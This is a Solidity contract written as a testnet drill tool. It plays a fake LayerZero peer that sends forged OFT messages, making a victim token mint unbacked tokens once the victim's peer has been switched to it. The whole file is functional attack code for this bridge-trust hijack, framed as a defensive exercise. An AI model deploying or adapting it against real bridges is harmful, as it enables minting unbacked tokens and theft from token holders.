// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
import {OAppCore} from "@layerzerolabs/oapp-evm/contracts/oapp/OAppCore.sol";
import {OAppSender, MessagingFee, MessagingReceipt} from "@layerzerolabs/oapp-evm/contracts/oapp/OAppSender.sol";
import {OptionsBuilder} from "@layerzerolabs/oapp-evm/contracts/oapp/libs/OptionsBuilder.sol";
import {OFTMsgCodec} from "@layerzerolabs/oft-evm/contracts/libs/OFTMsgCodec.sol";

/// @title AttackerPeer (DRILL ONLY)
/// @notice Testnet drill contract for nothief. It plays the fake peer in a bridge-trust hijack: once a victim OFT's
///         peer has been switched to this contract, it sends standard OFT messages that make the victim mint tokens
///         that were never burned anywhere. All roles in a drill (issuer, attacker, holder) are played by the team.
/// @dev Holds no tokens and has no mint function of its own. The victim only accepts these messages because its owner
///      pointed its peer here (the drill's "hijack" step); with the legitimate peer in place, they are rejected.
///      Used in scenario (b) (deployed on chain X, victim on Base) and scenario (a) (deployed on Base, victim on chain
///      X), PRD.md sections 7.6 and 8.4. Owner-only, so nobody else can fire drills from the team's deployment.
contract AttackerPeer is OAppSender {
    using OptionsBuilder for bytes;

    /// @notice Shown on explorers and in the dashboard so nobody mistakes this contract for a real token or bridge.
    string public constant DRILL_NOTICE = "DRILL ONLY: nothief testnet attacker peer. Sends fake OFT mint messages.";

    /// @notice A fake mint message was sent.
    /// @param dstEid Endpoint ID of the victim's chain.
    /// @param recipient Address that receives the minted tokens on the victim's chain.
    /// @param amountShared Amount in the OFT's shared decimals (6 by default).
    /// @param guid LayerZero message GUID, for tracking on LayerZero Scan.
    event FakeMintSent(uint32 indexed dstEid, address indexed recipient, uint64 amountShared, bytes32 guid);

    error ZeroRecipient();
    error ZeroAmount();

    /// @param endpoint_ LayerZero EndpointV2 on this chain.
    /// @param owner_ Drill operator. Also the LayerZero delegate.
    constructor(address endpoint_, address owner_) OAppCore(endpoint_, owner_) Ownable(owner_) {}

    /// @notice Quotes the LayerZero fee for `sendFakeMint`.
    /// @param dstEid Endpoint ID of the victim's chain. A peer (the victim token) must be set for it.
    /// @param recipient Address that receives the minted tokens.
    /// @param amountShared Amount in shared decimals.
    /// @param lzReceiveGas Gas for the victim's `lzReceive`.
    function quoteFakeMint(uint32 dstEid, address recipient, uint64 amountShared, uint128 lzReceiveGas)
        external
        view
        returns (MessagingFee memory fee)
    {
        return _quote(dstEid, _message(recipient, amountShared), _options(lzReceiveGas), false);
    }

    /// @notice Sends one OFT message that credits `amountShared` to `recipient` on the victim's chain.
    /// @dev Pay exactly the quoted native fee. Any refund goes to the caller.
    /// @param dstEid Endpoint ID of the victim's chain. A peer (the victim token) must be set for it.
    /// @param recipient Address that receives the minted tokens.
    /// @param amountShared Amount in shared decimals (for an 18-decimal OFT with 6 shared decimals, 1 token = 1e6).
    /// @param lzReceiveGas Gas for the victim's `lzReceive`.
    function sendFakeMint(uint32 dstEid, address recipient, uint64 amountShared, uint128 lzReceiveGas)
        external
        payable
        onlyOwner
        returns (MessagingReceipt memory receipt)
    {
        receipt = _lzSend(
            dstEid,
            _message(recipient, amountShared),
            _options(lzReceiveGas),
            MessagingFee(msg.value, 0),
            payable(msg.sender)
        );
        emit FakeMintSent(dstEid, recipient, amountShared, receipt.guid);
    }

    /// @dev Standard OFT message: recipient and amount in shared decimals, no compose payload.
    function _message(address recipient, uint64 amountShared) internal view returns (bytes memory message) {
        if (recipient == address(0)) revert ZeroRecipient();
        if (amountShared == 0) revert ZeroAmount();
        (message,) = OFTMsgCodec.encode(bytes32(uint256(uint160(recipient))), amountShared, "");
    }

    function _options(uint128 lzReceiveGas) internal pure returns (bytes memory) {
        return OptionsBuilder.newOptions().addExecutorLzReceiveOption(lzReceiveGas, 0);
    }
}
